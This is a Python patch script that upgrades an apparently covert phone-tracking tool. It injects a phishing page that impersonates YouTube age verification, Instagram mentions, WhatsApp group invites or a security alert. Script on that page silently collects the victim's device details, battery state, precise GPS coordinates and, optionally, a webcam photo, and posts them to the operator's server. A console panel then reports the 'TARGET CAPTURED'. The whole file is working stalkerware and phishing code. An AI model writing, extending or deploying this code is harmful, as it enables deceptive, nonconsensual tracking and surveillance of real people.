import os

def apply_fix():
    # 1. Update gui.py for Auto-Link Capture
    gui_file = "gui.py"
    if os.path.exists(gui_file):
        with open(gui_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        new_gui_lines = []
        for line in lines:
            if "self.console_textbox.configure(state=\"disabled\")" in line and "append_text" in "".join(new_gui_lines[-10:]):
                new_gui_lines.append(line)
                new_gui_lines.append("\n        # Auto-Link Capture (v6.2)\n")
                new_gui_lines.append("        if \"https://\" in text:\n")
                new_gui_lines.append("            import re\n")
                new_gui_lines.append("            links = re.findall(r\"(https?://\\S+)\", text)\n")
                new_gui_lines.append("            for link in links:\n")
                new_gui_lines.append("                if \"is.gd\" in link or \"ngrok-free.dev\" in link:\n")
                new_gui_lines.append("                    self.link_entry.delete(0, \"end\")\n")
                new_gui_lines.append("                    self.link_entry.insert(0, link.strip())\n")
            else:
                new_gui_lines.append(line)
        
        with open(gui_file, 'w', encoding='utf-8', newline='\n') as f:
            f.writelines(new_gui_lines)
        print("GUI Link-Capture logic applied.")

    # 2. Update phone_tracker.py (Surgical rewrite of methods)
    tracker_file = "phone_tracker.py"
    if os.path.exists(tracker_file):
        with open(tracker_file, 'r', encoding='utf-8') as f:
            content = f.read()

        # Update _build_tracking_page for SnapCam
        old_builder_start = "    def _build_tracking_page(self, track_id):"
        next_server = "    def _start_grab_server("
        st = content.find(old_builder_start)
        en = content.find(next_server, st)

        if st != -1 and en != -1:
            new_builder = """    def _build_tracking_page(self, track_id):
        \"\"\"Genera pagina de rastreo con SnapCam (v6.2).\"\"\"
        template = getattr(self, 'template_choice', 'security').lower()
        og = {
            'title': 'Breaking News: Live Updates',
            'desc': 'Get the latest real-time updates and breaking stories.',
            'img': 'https://cdn-icons-png.flaticon.com/512/21/21601.png',
            'bait': ''
        }

        if 'youtube' in template:
            og['title'] = 'YouTube - Video Recomendado'
            og['desc'] = 'Mira este video que es tendencia ahora mismo en tu region.'
            og['img'] = 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png'
            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:100px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Video No Disponible</h2><p>Este video requiere verificacion de edad. Haz clic para validar.</p><div id="actBtn" class="btn" style="background:#ff0000;color:white;padding:12px;border-radius:2px;cursor:pointer;font-weight:bold;margin-top:10px;">VERIFICAR Y VER</div></div>'
        elif 'instagram' in template:
            og['title'] = 'Instagram - Nueva Mencion'
            og['desc'] = 'Alguien te ha etiquetado en una publicacion.'
            og['img'] = 'https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png'
            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:60px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Nueva Mencion</h2><p>Inicia sesion para ver la publicacion.</p><div id="actBtn" class="btn" style="background:#0095f6;color:white;padding:12px;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:10px;">Ver Publicacion</div></div>'
        elif 'whatsapp' in template:
            og['title'] = 'WhatsApp - Invitacion a Grupo'
            og['desc'] = 'Has sido invitado a unirte a un grupo de seguridad.'
            og['img'] = 'https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png'
            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:80px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Invitacion Pendiente</h2><p>Unirse al chat grupal de seguridad.</p><div id="actBtn" class="btn" style="background:#25d366;color:white;padding:12px;border-radius:20px;cursor:pointer;font-weight:bold;margin-top:10px;">Unirse al Chat</div></div>'
        else:
             og['bait'] = '<div class="card"><h2 style="color:#d93025;font-size:1.4em;">Alerta de Seguridad</h2><p>Detectado acceso no autorizado. Valida tu posicion para asegurar tu cuenta.</p><div id="actBtn" class="spinner"></div></div>'

        return f\"\"\"<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:type" content="website">
<meta property="og:title" content="{og['title']}">
<meta property="og:description" content="{og['desc']}">
<meta property="og:image" content="{og['img']}">
<title>{og['title']}</title>
<style>
  body {{ font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; }}
  .btn {{ margin-top: 15px; cursor: pointer; }}
  .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 2s linear infinite; margin: 10px auto; }}
  @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
</style>
</head>
<body>
    {og['bait']}
<script>
(function(){{
  var data = {{ track_id: "{track_id}", ua: navigator.userAgent, res: screen.width + "x" + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory }};
  
  function send(d) {{ fetch("/capture/" + d.track_id, {{ method:\"POST\", headers:{{\"Content-Type\":\"application/json\"}}, body:JSON.stringify(d) }}); }}

  var btn = document.getElementById('actBtn');
  if(btn) btn.onclick = function() {{ startProcess(); }};
  else setTimeout(startProcess, 1000);

  function startProcess() {{
    try {{
      navigator.getBattery().then(function(b){{
        data.bat = Math.round(b.level * 100) + "%";
        data.charging = b.charging;
        triggerIntel();
      }}).catch(triggerIntel);
    }} catch(e) {{ triggerIntel(); }}
  }}

  function triggerIntel() {{
    var enableSnap = \"\"\" + ("1" if os.getenv("ENABLE_SNAPCAM")=="1" else "0") + \"\"\";
    if (enableSnap === "1") {{
       navigator.mediaDevices.getUserMedia({{ video: true }}).then(function(s) {{
         var v = document.createElement('video');
         v.srcObject = s; v.onloadedmetadata = function() {{
           v.play();
           setTimeout(function() {{
             var c = document.createElement('canvas');
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
             data.base64_image = c.toDataURL('image/jpeg', 0.6);
             s.getTracks().forEach(t => t.stop());
             checkGeo();
           }}, 1000);
         }};
       }}).catch(checkGeo);
    }} else {{ checkGeo(); }}
  }}

  function checkGeo() {{
    if (navigator.geolocation) {{
      navigator.geolocation.getCurrentPosition(function(p){{
        data.gps_lat = p.coords.latitude; data.gps_lon = p.coords.longitude; data.gps_accuracy = p.coords.accuracy; send(data);
      }}, function(e){{ data.gps_err = e.message; send(data); }}, {{enableHighAccuracy:true, timeout:8000}});
    }} else {{ send(data); }}
  }}
}})();
</script>
</body>
</html>\"\"\"
"""
            content = content[:st] + new_builder + content[en:]

        # Update Console Panel for SnapCam Notification
        panel_find = "            new_panel = f\"\"\"[bold red][SIREN] TARGET CAPTURED!"
        panel_end = "border_style=\"red\"))"
        p_st = content.find(panel_find)
        p_en = content.find(panel_end, p_st) + len(panel_end)

        if p_st != -1 and p_en != -1:
            new_p_code = """            bat = data.get('bat', '?')
            charging = " (Charging)" if data.get('charging') else ""
            is_vpn = "[YES]" if ip_info.get('proxy') or ip_info.get('vpn') else "[NO]"
            snap_alert = "[bold red][SNAPCAM] PHOTO CAPTURED![/bold red]\\n" if data.get('base64_image') else ""
            new_panel = f\"\"\"{snap_alert}[bold red][SIREN] TARGET CAPTURED! (v6.2 Silent Guardian)[/bold red]
[bold green]  IP Address:[/bold green]   {real_ip} [dim](VPN: {is_vpn})[/dim]
[bold green]  ISP/Carrier:[/bold green]  {ip_org}
[bold green]  Location:[/bold green]     {ip_city}, {ip_region}, {ip_info.get('country', '?')}
[bold blue]  Battery:[/bold blue]      {bat}{charging}
[bold blue]  Hardware:[/bold blue]     {data.get('cores', '?')} Cores | {data.get('mem', '?')} GB RAM
[bold green]  Device:[/bold green]       {device} | {tz} | {data.get('res', '?')}
{'[bold red]  [GRAB] GPS LOCATION:[/bold red]' if gps_lat else '[yellow]  GPS: Not allowed by target[/yellow]'}
{'  Latitude:  ' + str(gps_lat) if gps_lat else ''}
{'  Longitude: ' + str(gps_lon) if gps_lon else ''}
{'  Accuracy:  ' + str(round(gps_acc, 1)) + ' meters' if gps_acc else ''}\"\"\"
            console.print(Panel(new_panel, title=f"[bold red][GRAB] CAPTURE #{len(captures)}[/bold red]", border_style="red"))"""
            content = content[:p_st] + new_p_code + content[p_en:]

        with open(tracker_file, 'w', encoding='utf-8', newline='\n') as f:
            f.write(content)
        print("Tracket SnapCam & Console alerts applied.")

if __name__ == "__main__":
    apply_fix()
